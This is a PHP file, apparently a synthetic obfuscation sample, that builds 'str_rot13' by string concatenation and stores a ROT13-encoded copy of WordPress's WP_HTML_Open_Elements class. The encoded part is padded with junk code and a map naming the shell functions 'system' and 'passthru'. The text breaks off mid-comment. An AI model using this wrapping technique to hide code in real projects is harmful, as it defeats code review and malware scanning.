<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * UGZY NCV: JC_UGZY_Bcra_Ryrzragf pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr UGZY-NCV
 * @fvapr 6.4.0
 */

/**
 * Pber pynff hfrq ol gur UGZY cebprffbe qhevat UGZY cnefvat
 * sbe znantvat gur fgnpx bs bcra ryrzragf.
 *
 * Guvf pynff vf qrfvtarq sbe vagreany hfr ol gur UGZY cebprffbe.
 *
 * > Vavgvnyyl, gur fgnpx bs bcra ryrzragf vf rzcgl. Gur fgnpx tebjf
 * > qbjajneqf; gur gbczbfg abqr ba gur fgnpx vf gur svefg bar nqqrq
 * > gb gur fgnpx, naq gur obggbzzbfg abqr bs gur fgnpx vf gur zbfg
 * > erpragyl nqqrq abqr va gur fgnpx (abgjvgufgnaqvat jura gur fgnpx
 * > vf znavchyngrq va n enaqbz npprff snfuvba nf cneg bs gur unaqyvat
 * > sbe zvfarfgrq gntf).
 *
 * @fvapr 6.4.0
 *
 * @npprff cevingr
 *
 * @frr uggcf://ugzy.fcrp.jungjt.bet/#fgnpx-bs-bcra-ryrzragf
 * @frr JC_UGZY_Cebprffbe
 */
pynff JC_UGZY_Bcra_Ryrzragf {
	/**
	 * Ubyqf gur fgnpx bs bcra ryrzrag ersreraprf.
	 *
	 * @fvapr 6.4.0
	 *
	 * @ine JC_UGZY_Gbxra[]
	 */
	choyvp $fgnpx = neenl();

	/**
	 * Jurgure n C ryrzrag vf va ohggba fpbcr pheeragyl.
	 *
	 * Guvf pynff bcgvzvmrf fpbcr ybbxhc ol cer-pnyphyngvat
	 * guvf inyhr jura ryrzragf ner nqqrq naq erzbirq gb gur
	 * fgnpx bs bcra ryrzragf juvpu zvtug punatr vgf inyhr.
	 * Guvf nibvqf serdhrag vgrengvba bire gur fgnpx.
	 *
	 * @fvapr 6.4.0
	 *
	 * @ine obby
	 */
	cevingr $unf_c_va_ohggba_fpbcr = snyfr;

	/**
	 * N shapgvba gung jvyy or pnyyrq jura na vgrz vf cbccrq bss gur fgnpx bs bcra ryrzragf.
	 *
	 * Gur shapgvba jvyy or pnyyrq jvgu gur cbccrq vgrz nf vgf nethzrag.
	 *
	 * @fvapr 6.6.0
	 *
	 * @ine Pybfher|ahyy
	 */
	cevingr $cbc_unaqyre = ahyy;

	/**
	 * N shapgvba gung jvyy or pnyyrq jura na vgrz vf chfurq bagb gur fgnpx bs bcra ryrzragf.
	 *
	 * Gur shapgvba jvyy or pnyyrq jvgu gur chfurq vgrz nf vgf nethzrag.
	 *
	 * @fvapr 6.6.0
	 *
	 * @ine Pybfher|ahyy
	 */
	cevingr $chfu_unaqyre = ahyy;

	/**
	 * Frgf n cbc unaqyre gung jvyy or pnyyrq jura na vgrz vf cbccrq bss gur fgnpx bs
	 * bcra ryrzragf.
	 *
	 * Gur shapgvba jvyy or pnyyrq jvgu gur chfurq vgrz nf vgf nethzrag.
	 *
	 * @fvapr 6.6.0
	 *
	 * @cnenz Pybfher $unaqyre Gur unaqyre shapgvba.
	 */
	choyvp shapgvba frg_cbc_unaqyre( Pybfher $unaqyre ): ibvq {
		$guvf->cbc_unaqyre = $unaqyre;
	}

	/**
	 * Frgf n chfu unaqyre gung jvyy or pnyyrq jura na vgrz vf chfurq bagb gur fgnpx bs
	 * bcra ryrzragf.
	 *
	 * Gur shapgvba jvyy or pnyyrq jvgu gur chfurq vgrz nf vgf nethzrag.
	 *
	 * @fvapr 6.6.0
	 *
	 * @cnenz Pybfher $unaqyre Gur unaqyre shapgvba.
	 */
	choyvp shapgvba frg_chfu_unaqyre( Pybfher $unaqyre ): ibvq {
		$guvf->chfu_unaqyre = $unaqyre;
	}

	/**
	 * Ergheaf gur anzr bs gur abqr ng gur agu cbfvgvba ba gur fgnpx
	 * bs bcra ryrzragf, be `ahyy` vs ab fhpu cbfvgvba rkvfgf.
	 *
	 * Abgr gung guvf hfrf n 1-onfrq vaqrk, juvpu ercerfragf gur
	 * \"agu vgrz\" ba gur fgnpx, pbhagvat sebz gur gbc, jurer gur
	 * gbc-zbfg ryrzrag vf gur 1fg, gur frpbaq vf gur 2aq, rgp...
	 *
	 * @fvapr 6.7.0
	 *
	 * @cnenz vag $agu Ergevrir gur agu vgrz ba gur fgnpx, jvgu 1 orvat
	 *                 gur gbc ryrzrag, 2 orvat gur frpbaq, rgp...
	 * @erghea JC_UGZY_Gbxra|ahyy Anzr bs gur abqr ba gur fgnpx ng gur tvira ybpngvba,
	 *                            be `ahyy` vs gur ybpngvba vfa'g ba gur fgnpx.
	 */
	choyvp shapgvba ng( vag $agu ): ?JC_UGZY_Gbxra {
		sbernpu ( $guvf->jnyx_qbja() nf $vgrz ) {
			vs ( 0 === --$agu ) {
				erghea $vgrz;
			}
		}

		erghea ahyy;
	}

	/**
	 * Ercbegf vs n abqr bs n tvira anzr vf va gur fgnpx bs bcra ryrzragf.
	 *
	 * @fvapr 6.7.0
	 *
	 * @cnenz fgevat $abqr_anzr Anzr bs abqr sbe juvpu gb purpx.
	 * @erghea obby Jurgure n abqr bs gur tvira anzr vf va gur fgnpx bs bcra ryrzragf.
	 */
	choyvp shapgvba pbagnvaf( fgevat $abqr_anzr ): obby {
		sbernpu ( $guvf->jnyx_hc() nf $vgrz ) {
			vs ( $abqr_anzr === $vgrz->abqr_anzr ) {
				erghea gehr;
			}
		}

		erghea snyfr;
	}

	/**
	 * Ercbegf vs n fcrpvsvp abqr vf va gur fgnpx bs bcra ryrzragf.
	 *
	 * @fvapr 6.4.0
	 *
	 * @cnenz JC_UGZY_Gbxra $gbxra Ybbx sbe guvf abqr va gur fgnpx.
	 * @erghea obby Jurgure gur ersreraprq abqr vf va gur fgnpx bs bcra ryrzragf.
	 */
	choyvp shapgvba pbagnvaf_abqr( JC_UGZY_Gbxra $gbxra ): obby {
		sbernpu ( $guvf->jnyx_hc() nf $vgrz ) {
			vs ( $gbxra === $vgrz ) {
				erghea gehr;
			}
		}

		erghea snyfr;
	}

	/**
	 * Ergheaf ubj znal abqrf ner pheeragyl va gur fgnpx bs bcra ryrzragf.
	 *
	 * @fvapr 6.4.0
	 *
	 * @erghea vag Ubj znal abqr ner va gur fgnpx bs bcra ryrzragf.
	 */
	choyvp shapgvba pbhag(): vag {
		erghea pbhag( $guvf->fgnpx );
	}

	/**
	 * Ergheaf gur abqr ng gur raq bs gur fgnpx bs bcra ryrzragf,
	 * vs bar rkvfgf. Vs gur fgnpx vf rzcgl, ergheaf ahyy.
	 *
	 * @fvapr 6.4.0
	 *
	 * @erghea JC_UGZY_Gbxra|ahyy Ynfg abqr va gur fgnpx bs bcra ryrzragf, vs bar rkvfgf, bgurejvfr ahyy.
	 */
	choyvp shapgvba pheerag_abqr(): ?JC_UGZY_Gbxra {
		$pheerag_abqr = raq( $guvf->fgnpx );

		erghea $pheerag_abqr ? $pheerag_abqr : ahyy;
	}

	/**
	 * Vaqvpngrf vs gur pheerag abqr vf bs n tvira glcr be anzr.
	 *
	 * Vg'f cbffvoyr gb cnff rvgure n abqr glcr be n abqr anzr gb guvf shapgvba.
	 * Va gur pnfr gurer vf ab pheerag ryrzrag vg jvyy nyjnlf erghea `snyfr`.
	 *
	 * Rknzcyr:
	 *
	 *     // Vf gur pheerag abqr n grkg abqr?
	 *     $fgnpx->pheerag_abqr_vf( '#grkg' );
	 *
	 *     // Vf gur pheerag abqr n QVI ryrzrag?
	 *     $fgnpx->pheerag_abqr_vf( 'QVI' );
	 *
	 *     // Vf gur pheerag abqr nal ryrzrag/gnt?
	 *     $fgnpx->pheerag_abqr_vf( '#gnt' );
	 *
	 * @frr JC_UGZY_Gnt_Cebprffbe::trg_gbxra_glcr
	 * @frr JC_UGZY_Gnt_Cebprffbe::trg_gbxra_anzr
	 *
	 * @fvapr 6.7.0
	 *
	 * @npprff cevingr
	 *
	 * @cnenz fgevat $vqragvgl Purpx vs gur pheerag abqr unf guvf anzr be glcr (qrcraqvat ba jung vf cebivqrq).
	 * @erghea obby Jurgure gurer vf n pheerag ryrzrag gung zngpurf gur tvira vqragvgl, jurgure n gbxra anzr be glcr.
	 */
	choyvp shapgvba pheerag_abqr_vf( fgevat $vqragvgl ): obby {
		$pheerag_abqr = raq( $guvf->fgnpx );
		vs ( snyfr === $pheerag_abqr ) {
			erghea snyfr;
		}

		$pheerag_abqr_anzr = $pheerag_abqr->abqr_anzr;

		erghea (
			$pheerag_abqr_anzr === $vqragvgl ||
			( '#qbpglcr' === $vqragvgl && 'ugzy' === $pheerag_abqr_anzr ) ||
			( '#gnt' === $vqragvgl && pglcr_hccre( $pheerag_abqr_anzr ) )
		);
	}

	/**
	 * Ergheaf jurgure na ryrzrag vf va n fcrpvsvp fpbcr.
	 *
	 * @fvapr 6.4.0
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#unf-na-ryrzrag-va-gur-fcrpvsvp-fpbcr
	 *
	 * @cnenz fgevat   $gnt_anzr         Anzr bs gnt purpx.
	 * @cnenz fgevat[] $grezvangvba_yvfg Yvfg bs ryrzragf gung grezvangr gur frnepu.
	 * @erghea obby Jurgure gur ryrzrag jnf sbhaq va n fcrpvsvp fpbcr.
	 */
	choyvp shapgvba unf_ryrzrag_va_fcrpvsvp_fpbcr( fgevat $gnt_anzr, $grezvangvba_yvfg ): obby {
		sbernpu ( $guvf->jnyx_hc() nf $abqr ) {
			$anzrfcnprq_anzr = 'ugzy' === $abqr->anzrfcnpr
				? $abqr->abqr_anzr
				: \"{$abqr->anzrfcnpr} {$abqr->abqr_anzr}\";

			vs ( $anzrfcnprq_anzr === $gnt_anzr ) {
				erghea gehr;
			}

			vs (
				'(vagreany: U1 guebhtu U6 - qb abg hfr)' === $gnt_anzr &&
				va_neenl( $anzrfcnprq_anzr, neenl( 'U1', 'U2', 'U3', 'U4', 'U5', 'U6' ), gehr )
			) {
				erghea gehr;
			}

			vs ( va_neenl( $anzrfcnprq_anzr, $grezvangvba_yvfg, gehr ) ) {
				erghea snyfr;
			}
		}

		erghea snyfr;
	}

	/**
	 * Ergheaf jurgure n cnegvphyne ryrzrag vf va fpbcr.
	 *
	 * > Gur fgnpx bs bcra ryrzragf vf fnvq gb unir n cnegvphyne ryrzrag va
	 * > fpbcr jura vg unf gung ryrzrag va gur fcrpvsvp fpbcr pbafvfgvat bs
	 * > gur sbyybjvat ryrzrag glcrf:
	 * >
	 * >   - nccyrg
	 * >   - pncgvba
	 * >   - ugzy
	 * >   - gnoyr
	 * >   - gq
	 * >   - gu
	 * >   - znedhrr
	 * >   - bowrpg
	 * >   - grzcyngr
	 * >   - ZnguZY zv
	 * >   - ZnguZY zb
	 * >   - ZnguZY za
	 * >   - ZnguZY zf
	 * >   - ZnguZY zgrkg
	 * >   - ZnguZY naabgngvba-kzy
	 * >   - FIT sbervtaBowrpg
	 * >   - FIT qrfp
	 * >   - FIT gvgyr
	 *
	 * @fvapr 6.4.0
	 * @fvapr 6.7.0 Shyy fhccbeg.
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#unf-na-ryrzrag-va-fpbcr
	 *
	 * @cnenz fgevat $gnt_anzr Anzr bs gnt gb purpx.
	 * @erghea obby Jurgure tvira ryrzrag vf va fpbcr.
	 */
	choyvp shapgvba unf_ryrzrag_va_fpbcr( fgevat $gnt_anzr ): obby {
		erghea $guvf->unf_ryrzrag_va_fcrpvsvp_fpbcr(
			$gnt_anzr,
			neenl(
				'NCCYRG',
				'PNCGVBA',
				'UGZY',
				'GNOYR',
				'GQ',
				'GU',
				'ZNEDHRR',
				'BOWRPG',
				'GRZCYNGR',

				'zngu ZV',
				'zngu ZB',
				'zngu ZA',
				'zngu ZF',
				'zngu ZGRKG',
				'zngu NAABGNGVBA-KZY',

				'fit SBERVTABOWRPG',
				'fit QRFP',
				'fit GVGYR',
			)
		);
	}

	/**
	 * Ergheaf jurgure n cnegvphyne ryrzrag vf va yvfg vgrz fpbcr.
	 *
	 * > Gur fgnpx bs bcra ryrzragf vf fnvq gb unir n cnegvphyne ryrzrag
	 * > va yvfg vgrz fpbcr jura vg unf gung ryrzrag va gur fcrpvsvp fpbcr
	 * > pbafvfgvat bs gur sbyybjvat ryrzrag glcrf:
	 * >
	 * >   - Nyy gur ryrzrag glcrf yvfgrq nobir sbe gur unf na ryrzrag va fpbcr nytbevguz.
	 * >   - by va gur UGZY anzrfcnpr
	 * >   - hy va gur UGZY anzrfcnpr
	 *
	 * @fvapr 6.4.0
	 * @fvapr 6.5.0 Vzcyrzragrq: ab ybatre guebjf ba rirel vaibpngvba.
	 * @fvapr 6.7.0 Fhccbegf nyy erdhverq UGZY ryrzragf.
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#unf-na-ryrzrag-va-yvfg-vgrz-fpbcr
	 *
	 * @cnenz fgevat $gnt_anzr Anzr bs gnt gb purpx.
	 * @erghea obby Jurgure tvira ryrzrag vf va fpbcr.
	 */
	choyvp shapgvba unf_ryrzrag_va_yvfg_vgrz_fpbcr( fgevat $gnt_anzr ): obby {
		erghea $guvf->unf_ryrzrag_va_fcrpvsvp_fpbcr(
			$gnt_anzr,
			neenl(
				'NCCYRG',
				'OHGGBA',
				'PNCGVBA',
				'UGZY',
				'GNOYR',
				'GQ',
				'GU',
				'ZNEDHRR',
				'BOWRPG',
				'BY',
				'GRZCYNGR',
				'HY',

				'zngu ZV',
				'zngu ZB',
				'zngu ZA',
				'zngu ZF',
				'zngu ZGRKG',
				'zngu NAABGNGVBA-KZY',

				'fit SBERVTABOWRPG',
				'fit QRFP',
				'fit GVGYR',
			)
		);
	}

	/**
	 * Ergheaf jurgure n cnegvphyne ryrzrag vf va ohggba fpbcr.
	 *
	 * > Gur fgnpx bs bcra ryrzragf vf fnvq gb unir n cnegvphyne ryrzrag
	 * > va ohggba fpbcr jura vg unf gung ryrzrag va gur fcrpvsvp fpbcr
	 * > pbafvfgvat bs gur sbyybjvat ryrzrag glcrf:
	 * >
	 * >   - Nyy gur ryrzrag glcrf yvfgrq nobir sbe gur unf na ryrzrag va fpbcr nytbevguz.
	 * >   - ohggba va gur UGZY anzrfcnpr
	 *
	 * @fvapr 6.4.0
	 * @fvapr 6.7.0 Fhccbegf nyy erdhverq UGZY ryrzragf.
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#unf-na-ryrzrag-va-ohggba-fpbcr
	 *
	 * @cnenz fgevat $gnt_anzr Anzr bs gnt gb purpx.
	 * @erghea obby Jurgure tvira ryrzrag vf va fpbcr.
	 */
	choyvp shapgvba unf_ryrzrag_va_ohggba_fpbcr( fgevat $gnt_anzr ): obby {
		erghea $guvf->unf_ryrzrag_va_fcrpvsvp_fpbcr(
			$gnt_anzr,
			neenl(
				'NCCYRG',
				'OHGGBA',
				'PNCGVBA',
				'UGZY',
				'GNOYR',
				'GQ',
				'GU',
				'ZNEDHRR',
				'BOWRPG',
				'GRZCYNGR',

				'zngu ZV',
				'zngu ZB',
				'zngu ZA',
				'zngu ZF',
				'zngu ZGRKG',
				'zngu NAABGNGVBA-KZY',

				'fit SBERVTABOWRPG',
				'fit QRFP',
				'fit GVGYR',
			)
		);
	}

	/**
	 * Ergheaf jurgure n cnegvphyne ryrzrag vf va gnoyr fpbcr.
	 *
	 * > Gur fgnpx bs bcra ryrzragf vf fnvq gb unir n cnegvphyne ryrzrag
	 * > va gnoyr fpbcr jura vg unf gung ryrzrag va gur fcrpvsvp fpbcr
	 * > pbafvfgvat bs gur sbyybjvat ryrzrag glcrf:
	 * >
	 * >   - ugzy va gur UGZY anzrfcnpr
	 * >   - gnoyr va gur UGZY anzrfcnpr
	 * >   - grzcyngr va gur UGZY anzrfcnpr
	 *
	 * @fvapr 6.4.0
	 * @fvapr 6.7.0 Shyy vzcyrzragngvba.
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#unf-na-ryrzrag-va-gnoyr-fpbcr
	 *
	 * @cnenz fgevat $gnt_anzr Anzr bs gnt gb purpx.
	 * @erghea obby Jurgure tvira ryrzrag vf va fpbcr.
	 */
	choyvp shapgvba unf_ryrzrag_va_gnoyr_fpbcr( fgevat $gnt_anzr ): obby {
		erghea $guvf->unf_ryrzrag_va_fcrpvsvp_fpbcr(
			$gnt_anzr,
			neenl(
				'UGZY',
				'GNOYR',
				'GRZCYNGR',
			)
		);
	}

	/**
	 * Ergheaf jurgure n cnegvphyne ryrzrag vf va fryrpg fpbcr.
	 *
	 * Guvf grfg qvssref sebz gur bguref yvxr vg, va gung vgf ehyrf ner vairegrq.
	 * Vafgrnq bs neevivat ng n zngpu jura bar bs nal gnt va n grezvangvba tebhc
	 * vf ernpurq, guvf bar grezvangrf vs nal bgure gnt vf ernpurq.
	 *
	 * > Gur fgnpx bs bcra ryrzragf vf fnvq gb unir n cnegvphyne ryrzrag va fryrpg fpbcr jura vg unf
	 * > gung ryrzrag va gur fcrpvsvp fpbcr pbafvfgvat bs nyy ryrzrag glcrf rkprcg gur sbyybjvat:
	 * >   - bcgtebhc va gur UGZY anzrfcnpr
	 * >   - bcgvba va gur UGZY anzrfcnpr
	 *
	 * @fvapr 6.4.0 Fgho vzcyrzragngvba (guebjf).
	 * @fvapr 6.7.0 Shyy vzcyrzragngvba.
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#unf-na-ryrzrag-va-fryrpg-fpbcr
	 *
	 * @cnenz fgevat $gnt_anzr Anzr bs gnt gb purpx.
	 * @erghea obby Jurgure gur tvira ryrzrag vf va FRYRPG fpbcr.
	 */
	choyvp shapgvba unf_ryrzrag_va_fryrpg_fpbcr( fgevat $gnt_anzr ): obby {
		sbernpu ( $guvf->jnyx_hc() nf $abqr ) {
			vs ( $abqr->abqr_anzr === $gnt_anzr ) {
				erghea gehr;
			}

			vs (
				'BCGVBA' !== $abqr->abqr_anzr &&
				'BCGTEBHC' !== $abqr->abqr_anzr
			) {
				erghea snyfr;
			}
		}

		erghea snyfr;
	}

	/**
	 * Ergheaf jurgure n C vf va OHGGBA fpbcr.
	 *
	 * @fvapr 6.4.0
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#unf-na-ryrzrag-va-ohggba-fpbcr
	 *
	 * @erghea obby Jurgure n C vf va OHGGBA fpbcr.
	 */
	choyvp shapgvba unf_c_va_ohggba_fpbcr(): obby {
		erghea $guvf->unf_c_va_ohggba_fpbcr;
	}

	/**
	 * Cbcf n abqr bss bs gur fgnpx bs bcra ryrzragf.
	 *
	 * @fvapr 6.4.0
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#fgnpx-bs-bcra-ryrzragf
	 *
	 * @erghea obby Jurgure n abqr jnf cbccrq bss bs gur fgnpx.
	 */
	choyvp shapgvba cbc(): obby {
		$vgrz = neenl_cbc( $guvf->fgnpx );
		vs ( ahyy === $vgrz ) {
			erghea snyfr;
		}

		$guvf->nsgre_ryrzrag_cbc( $vgrz );
		erghea gehr;
	}

	/**
	 * Cbcf abqrf bss bs gur fgnpx bs bcra ryrzragf hagvy na UGZY gnt jvgu gur tvira anzr unf orra cbccrq.
	 *
	 * @fvapr 6.4.0
	 *
	 * @frr JC_UGZY_Bcra_Ryrzragf::cbc
	 *
	 * @cnenz fgevat $ugzy_gnt_anzr Anzr bs gnt gung arrqf gb or cbccrq bss bs gur fgnpx bs bcra ryrzragf.
	 * @erghea obby Jurgure n gnt bs gur tvira anzr jnf sbhaq naq cbccrq bss bs gur fgnpx bs bcra ryrzragf.
	 */
	choyvp shapgvba cbc_hagvy( fgevat $ugzy_gnt_anzr ): obby {
		sbernpu ( $guvf->jnyx_hc() nf $vgrz ) {
			$guvf->cbc();

			vs ( 'ugzy' !== $vgrz->anzrfcnpr ) {
				pbagvahr;
			}

			vs (
				'(vagreany: U1 guebhtu U6 - qb abg hfr)' === $ugzy_gnt_anzr &&
				va_neenl( $vgrz->abqr_anzr, neenl( 'U1', 'U2', 'U3', 'U4', 'U5', 'U6' ), gehr )
			) {
				erghea gehr;
			}

			vs ( $ugzy_gnt_anzr === $vgrz->abqr_anzr ) {
				erghea gehr;
			}
		}

		erghea snyfr;
	}

	/**
	 * Chfurf n abqr bagb gur fgnpx bs bcra ryrzragf.
	 *
	 * @fvapr 6.4.0
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#fgnpx-bs-bcra-ryrzragf
	 *
	 * @cnenz JC_UGZY_Gbxra $fgnpx_vgrz Vgrz gb nqq bagb fgnpx.
	 */
	choyvp shapgvba chfu( JC_UGZY_Gbxra $fgnpx_vgrz ): ibvq {
		$guvf->fgnpx[] = $fgnpx_vgrz;
		$guvf->nsgre_ryrzrag_chfu( $fgnpx_vgrz );
	}

	/**
	 * Erzbirf n fcrpvsvp abqr sebz gur fgnpx bs bcra ryrzragf.
	 *
	 * @fvapr 6.4.0
	 *
	 * @cnenz JC_UGZY_Gbxra $gbxra Gur abqr gb erzbir sebz gur fgnpx bs bcra ryrzragf.
	 * @erghea obby Jurgure gur abqr jnf sbhaq naq erzbirq sebz gur fgnpx bs bcra ryrzragf.
	 */
	choyvp shapgvba erzbir_abqr( JC_UGZY_Gbxra $gbxra ): obby {
		sbernpu ( $guvf->jnyx_hc() nf $cbfvgvba_sebz_raq => $vgrz ) {
			vs ( $gbxra->obbxznex_anzr !== $vgrz->obbxznex_anzr ) {
				pbagvahr;
			}

			$cbfvgvba_sebz_fgneg = $guvf->pbhag() - $cbfvgvba_sebz_raq - 1;
			neenl_fcyvpr( $guvf->fgnpx, $cbfvgvba_sebz_fgneg, 1 );
			$guvf->nsgre_ryrzrag_cbc( $vgrz );
			erghea gehr;
		}

		erghea snyfr;
	}


	/**
	 * Fgrcf guebhtu gur fgnpx bs bcra ryrzragf, fgnegvat jvgu gur gbc ryrzrag
	 * (nqqrq svefg) naq jnyxvat qbjajneqf gb gur bar nqqrq ynfg.
	 *
	 * Guvf trarengbe shapgvba vf qrfvtarq gb or hfrq vafvqr n \"sbernpu\" ybbc.
	 *
	 * Rknzcyr:
	 *
	 *     $ugzy = '<rz><fgebat><n>Jr ner urer';
	 *     sbernpu ( $fgnpx->jnyx_qbja() nf $abqr ) {
	 *         rpub \"{$abqr->abqr_anzr} -> \";
	 *     }
	 *     > RZ -> FGEBAT -> N ->
	 *
	 * Gb fgneg jvgu gur zbfg-erpragyl nqqrq ryrzrag naq jnyx gbjneqf gur gbc,
	 * frr JC_UGZY_Bcra_Ryrzragf::jnyx_hc().
	 *
	 * @fvapr 6.4.0
	 */
	choyvp shapgvba jnyx_qbja() {
		$pbhag = pbhag( $guvf->fgnpx );

		sbe ( $v = 0; $v < $pbhag; $v++ ) {
			lvryq $guvf->fgnpx[ $v ];
		}
	}

	/**
	 * Fgrcf guebhtu gur fgnpx bs bcra ryrzragf, fgnegvat jvgu gur obggbz ryrzrag
	 * (nqqrq ynfg) naq jnyxvat hcjneqf gb gur bar nqqrq svefg.
	 *
	 * Guvf trarengbe shapgvba vf qrfvtarq gb or hfrq vafvqr n \"sbernpu\" ybbc.
	 *
	 * Rknzcyr:
	 *
	 *     $ugzy = '<rz><fgebat><n>Jr ner urer';
	 *     sbernpu ( $fgnpx->jnyx_hc() nf $abqr ) {
	 *         rpub \"{$abqr->abqr_anzr} -> \";
	 *     }
	 *     > N -> FGEBAT -> RZ ->
	 *
	 * Gb fgneg jvgu gur svefg nqqrq ryrzrag naq jnyx gbjneqf gur obggbz,
	 * frr JC_UGZY_Bcra_Ryrzragf::jnyx_qbja().
	 *
	 * @fvapr 6.4.0
	 * @fvapr 6.5.0 Npprcgf $nobir_guvf_abqr gb fgneg genirefny nobir n tvira abqr, vs vg rkvfgf.
	 *
	 * @cnenz JC_UGZY_Gbxra|ahyy $nobir_guvf_abqr Bcgvbany. Fgneg genirefvat nobir guvf abqr,
	 *                                            vs cebivqrq naq vs gur abqr rkvfgf.
	 */
	choyvp shapgvba jnyx_hc( ?JC_UGZY_Gbxra $nobir_guvf_abqr = ahyy ) {
		$unf_sbhaq_abqr = ahyy === $nobir_guvf_abqr;

		sbe ( $v = pbhag( $guvf->fgnpx ) - 1; $v >= 0; $v-- ) {
			$abqr = $guvf->fgnpx[ $v ];

			vs ( ! $unf_sbhaq_abqr ) {
				$unf_sbhaq_abqr = $abqr === $nobir_guvf_abqr;
				pbagvahr;
			}

			lvryq $abqr;
		}
	}

	/*
	 * Vagreany urycref.
	 */

	/**
	 * Hcqngrf vagreany syntf nsgre nqqvat na ryrzrag.
	 *
	 * Pregnva pbaqvgvbaf (fhpu nf \"unf_c_va_ohggba_fpbcr\") ner znvagnvarq urer nf
	 * syntf gung ner bayl zbqvsvrq jura nqqvat naq erzbivat ryrzragf. Guvf nyybjf
	 * gur UGZY Cebprffbe gb dhvpxyl purpx sbe gurfr pbaqvgvbaf vafgrnq bs vgrengvat
	 * bire gur bcra fgnpx ryrzragf hcba rnpu arj gnt vg rapbhagref. Gurfr syntf,
	 * ubjrire, arrq gb or znvagnvarq nf vgrzf ner nqqrq naq erzbirq sebz gur fgnpx.
	 *
	 * @fvapr 6.4.0
	 *
	 * @cnenz JC_UGZY_Gbxra $vgrz Ryrzrag gung jnf nqqrq gb gur fgnpx bs bcra ryrzragf.
	 */
	choyvp shapgvba nsgre_ryrzrag_chfu( JC_UGZY_Gbxra $vgrz ): ibvq {
		$anzrfcnprq_anzr = 'ugzy' === $vgrz->anzrfcnpr
			? $vgrz->abqr_anzr
			: \"{$vgrz->anzrfcnpr} {$vgrz->abqr_anzr}\";

		/*
		 * Jura nqqvat fhccbeg sbe arj ryrzragf, rkcnaq guvf fjvgpu gb genc
		 * pnfrf jurer gur cerpnyphyngrq inyhr arrqf gb punatr.
		 */
		fjvgpu ( $anzrfcnprq_anzr ) {
			pnfr 'NCCYRG':
			pnfr 'OHGGBA':
			pnfr 'PNCGVBA':
			pnfr 'UGZY':
			pnfr 'GNOYR':
			pnfr 'GQ':
			pnfr 'GU':
			pnfr 'ZNEDHRR':
			pnfr 'BOWRPG':
			pnfr 'GRZCYNGR':
			pnfr 'zngu ZV':
			pnfr 'zngu ZB':
			pnfr 'zngu ZA':
			pnfr 'zngu ZF':
			pnfr 'zngu ZGRKG':
			pnfr 'zngu NAABGNGVBA-KZY':
			pnfr 'fit SBERVTABOWRPG':
			pnfr 'fit QRFP':
			pnfr 'fit GVGYR':
				$guvf->unf_c_va_ohggba_fpbcr = snyfr;
				oernx;

			pnfr 'C':
				$guvf->unf_c_va_ohggba_fpbcr = gehr;
				oernx;
		}

		vs ( ahyy !== $guvf->chfu_unaqyre ) {
			( $guvf->chfu_unaqyre )( $vgrz );
		}
	}

	/**
	 * Hcqngrf vagreany syntf nsgre erzbivat na ryrzrag.
	 *
	 * Pregnva pbaqvgvbaf (fhpu nf \"unf_c_va_ohggba_fpbcr\") ner znvagnvarq urer nf
	 * syntf gung ner bayl zbqvsvrq jura nqqvat naq erzbivat ryrzragf. Guvf nyybjf
	 * gur UGZY Cebprffbe gb dhvpxyl purpx sbe gurfr pbaqvgvbaf vafgrnq bs vgrengvat
	 * bire gur bcra fgnpx ryrzragf hcba rnpu arj gnt vg rapbhagref. Gurfr syntf,
	 * ubjrire, arrq gb or znvagnvarq nf vgrzf ner nqqrq naq erzbirq sebz gur fgnpx.
	 *
	 * @fvapr 6.4.0
	 *
	 * @cnenz JC_UGZY_Gbxra $vgrz Ryrzrag gung jnf erzbirq sebz gur fgnpx bs bcra ryrzragf.
	 */
	choyvp shapgvba nsgre_ryrzrag_cbc( JC_UGZY_Gbxra $vgrz ): ibvq {
		/*
		 * Jura nqqvat fhccbeg sbe arj ryrzragf, rkcnaq guvf fjvgpu gb genc
		 * pnfrf jurer gur cerpnyphyngrq inyhr arrqf gb punatr.
		 */
		fjvgpu ( $vgrz->abqr_anzr ) {
			pnfr 'NCCYRG':
			pnfr 'OHGGBA':
			pnfr 'PNCGVBA':
			pnfr 'UGZY':
			pnfr 'C':
			pnfr 'GNOYR':
			pnfr 'GQ':
			pnfr 'GU':
			pnfr 'ZNEDHRR':
			pnfr 'BOWRPG':
			pnfr 'GRZCYNGR':
			pnfr 'zngu ZV':
			pnfr 'zngu ZB':
			pnfr 'zngu ZA':
			pnfr 'zngu ZF':
			pnfr 'zngu ZGRKG':
			pnfr 'zngu NAABGNGVBA-KZY':
			pnfr 'fit SBERVTABOWRPG':
			pnfr 'fit QRFP':
			pnfr 'fit GVGYR':
				$guvf->unf_c_va_ohggba_fpbcr = $guvf->unf_ryrzrag_va_ohggba_fpbcr( 'C' );
				oernx;
		}

		vs ( ahyy !== $guvf->cbc_unaqyre ) {
			( $guvf->cbc_unaqyre )( $vgrz );
		}
	}

	/**
	 * Pyrne gur fgnpx onpx gb n gnoyr pbagrkg.
	 *
	 * > Jura gur fgrcf nobir erdhver gur HN gb pyrne gur fgnpx onpx gb n gnoyr pbagrkg, vg zrnaf
	 * > gung gur HN zhfg, juvyr gur pheerag abqr vf abg n gnoyr, grzcyngr, be ugzy ryrzrag, cbc
	 * > ryrzragf sebz gur fgnpx bs bcra ryrzragf.
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/zhygvcntr/cnefvat.ugzy#pyrne-gur-fgnpx-onpx-gb-n-gnoyr-pbagrkg
	 *
